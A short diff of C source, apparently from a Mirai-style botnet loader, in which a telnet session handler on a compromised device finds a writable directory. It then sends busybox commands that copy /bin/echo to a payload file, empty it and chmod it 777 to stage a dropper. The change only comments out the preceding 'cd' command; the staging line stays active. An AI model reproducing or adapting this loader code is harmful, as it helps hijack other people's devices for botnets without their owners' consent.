@@ -351,7 +351,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 #ifdef DEBUG
                             printf("[FD%d] Found writeable directory: %s/\n", ev->data.fd, conn->info.writedir);
 #endif
-                            util_sockprintf(conn->fd, "cd %s/\r\n", conn->info.writedir, conn->info.writedir);
+                           // util_sockprintf(conn->fd, "cd %s/\r\n", conn->info.writedir, conn->info.writedir);
                             util_sockprintf(conn->fd, "/bin/busybox cp /bin/echo " FN_BINARY "; >" FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n");
                             conn->state_telnet = TELNET_COPY_ECHO;
                             conn->timeout = 120;
